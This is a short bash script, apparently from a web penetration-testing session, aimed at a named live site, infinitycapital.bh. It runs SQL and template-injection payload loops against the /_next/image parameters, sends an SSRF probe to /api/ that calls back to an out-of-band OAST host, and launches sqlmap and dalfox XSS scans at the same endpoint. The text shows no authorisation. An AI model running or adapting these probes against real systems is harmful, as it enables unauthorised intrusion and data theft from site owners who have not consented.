#!/bin/bash
# Depth-phase injection testing vs. the ONLY reachable surface (/api/ and /_next/image)
# The Vercel WAF returns 403 at the edge for every request -> record oracle output.
O="dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
U="https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75"
echo "=== 1. SQLi manual differential on url/w/q (8 payloads each) ==="
for p in url w q; do
  for pay in "1" "1'" "1 AND 1=1" "1 AND 1=2" "1;WAITFOR+DELAY+'0:0:5'--" "1 OR SLEEP(5)" "1 UNION SELECT null--" "\${7*7}"; do
    code=$(curl -sk -m 10 -o /dev/null -w "%{http_code}:%{size_download}" -G --data-urlencode "$p=$pay" "https://www.infinitycapital.bh/_next/image")
    echo "  $p = $pay -> $code"
  done
done
echo "=== 2. OOB callbacks minted for /api/ and /_next/image (xxe/ssrf/sqli probes) ==="
echo "  (hosts passed inline; see run below)"
curl -sk -m 10 -o /dev/null -w "  api GET -> %{http_code}\n" "https://www.infinitycapital.bh/api/"
curl -sk -m 10 -o /dev/null -w "  api SSRF url -> %{http_code}\n" "https://www.infinitycapital.bh/api/?url=http://ssrfprobe1.$O/"
echo "=== 3. sqlmap against /_next/image (url,w,q) ==="
timeout 300 sqlmap -u "$U" --batch --level=3 --risk=2 --smart --retries=1 --timeout=10 --threads=4 --technique=BEUSTQ --dbms=0 -p "url,w,q" 2>&1 | tail -25
echo "=== 4. dalfox xss against same endpoint ==="
timeout 120 dalfox url "$U" -p url,w,q --silence 2>&1 | tail -10
